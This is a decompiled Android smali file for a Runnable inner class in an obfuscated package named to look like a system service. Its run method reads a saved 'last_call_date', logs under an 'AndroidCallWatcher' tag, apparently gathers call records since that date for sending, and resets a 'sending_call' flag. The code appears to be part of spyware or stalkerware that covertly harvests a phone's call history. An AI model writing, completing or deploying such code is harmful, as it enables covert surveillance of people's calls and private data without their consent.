.class Lcom/systemservice/a/c/c/f;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/c/i;->a(Lcom/systemservice/a/d/b;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/SharedPreferences;

.field final synthetic b:Lcom/systemservice/a/d/b;

.field final synthetic c:Landroid/content/Context;

.field final synthetic d:Lcom/systemservice/a/c/c/i;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/c/i;Landroid/content/SharedPreferences;Lcom/systemservice/a/d/b;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/c/f;->d:Lcom/systemservice/a/c/c/i;

    iput-object p2, p0, Lcom/systemservice/a/c/c/f;->a:Landroid/content/SharedPreferences;

    iput-object p3, p0, Lcom/systemservice/a/c/c/f;->b:Lcom/systemservice/a/d/b;

    iput-object p4, p0, Lcom/systemservice/a/c/c/f;->c:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 12

    const-string v0, ""

    const-string v1, "sending_call"

    const-string v2, "AndroidCallWatcher"

    const-string v3, "FINALLY CALL"

    const/4 v4, 0x0

    :try_start_0
    iget-object v5, p0, Lcom/systemservice/a/c/c/f;->a:Landroid/content/SharedPreferences;

    const-string v6, "last_call_date"

    const-wide/16 v7, 0x0

    invoke-interface {v5, v6, v7, v8}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v5

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v9, v5, v6}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v2, v9}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v9, 0x0

    cmp-long v10, v5, v7

    if-nez v10, :cond_0

    iget-object v5, p0, Lcom/systemservice/a/c/c/f;->d:Lcom/systemservice/a/c/c/i;

    iget-object v6, p0, Lcom/systemservice/a/c/c/f;->b:Lcom/systemservice/a/d/b;

    check-cast v6, Lcom/systemservice/a/b/a;

    invoke-virtual {v6}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object v6

    invoke-static {v5, v6, v9, v9}, Lcom/systemservice/a/c/c/i;->a(Lcom/systemservice/a/c/c/i;Landroid/content/Context;Ljava/util/Date;Ljava/util/Date;)V

    goto :goto_0

    :cond_0
    new-instance v7, Ljava/util/Date;

    const-wide/16 v10, 0x1

    add-long/2addr v5, v10

    const-wide/16 v10, 0x3e8

    mul-long v5, v5, v10

    invoke-direct {v7, v5, v6}, Ljava/util/Date;-><init>(J)V

    iget-object v5, p0, Lcom/systemservice/a/c/c/f;->d:Lcom/systemservice/a/c/c/i;

    iget-object v6, p0, Lcom/systemservice/a/c/c/f;->b:Lcom/systemservice/a/d/b;

    check-cast v6, Lcom/systemservice/a/b/a;

    invoke-virtual {v6}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object v6

    invoke-static {v5, v6, v7, v9}, Lcom/systemservice/a/c/c/i;->a(Lcom/systemservice/a/c/c/i;Landroid/content/Context;Ljava/util/Date;Ljava/util/Date;)V

    :goto_0
    iget-object v5, p0, Lcom/systemservice/a/c/c/f;->d:Lcom/systemservice/a/c/c/i;

    iget-object v5, v5, Lcom/systemservice/a/d/g;->b:Lcom/systemservice/a/h/b;

    check-cast v5, Lcom/systemservice/a/h/f;

    iget-object v6, p0, Lcom/systemservice/a/c/c/f;->d:Lcom/systemservice/a/c/c/i;

    iget-object v7, p0, Lcom/systemservice/a/c/c/f;->c:Landroid/content/Context;

    invoke-static {v6, v7, v5}, Lcom/systemservice/a/c/c/i;->a(Lcom/systemservice/a/c/c/i;Landroid/content/Context;Lcom/systemservice/a/h/f;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_1

    :catchall_0
    move-exception v0

    goto :goto_2

    :catch_0
    move-exception v5

    :try_start_1
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v2, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v6, p0, Lcom/systemservice/a/c/c/f;->d:Lcom/systemservice/a/c/c/i;

    invoke-static {v6}, Lcom/systemservice/a/c/c/i;->a(Lcom/systemservice/a/c/c/i;)Lorg/apache/log4j/Logger;

    move-result-object v6

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :goto_1
    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/systemservice/a/c/c/f;->d:Lcom/systemservice/a/c/c/i;

    invoke-static {v0}, Lcom/systemservice/a/c/c/i;->a(Lcom/systemservice/a/c/c/i;)Lorg/apache/log4j/Logger;

    move-result-object v0

    invoke-virtual {v0, v3}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object v0, p0, Lcom/systemservice/a/c/c/f;->c:Landroid/content/Context;

    invoke-static {v0, v1, v4}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    return-void

    :goto_2
    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, p0, Lcom/systemservice/a/c/c/f;->d:Lcom/systemservice/a/c/c/i;

    invoke-static {v2}, Lcom/systemservice/a/c/c/i;->a(Lcom/systemservice/a/c/c/i;)Lorg/apache/log4j/Logger;

    move-result-object v2

    invoke-virtual {v2, v3}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object v2, p0, Lcom/systemservice/a/c/c/f;->c:Landroid/content/Context;

    invoke-static {v2, v1, v4}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    throw v0
.end method
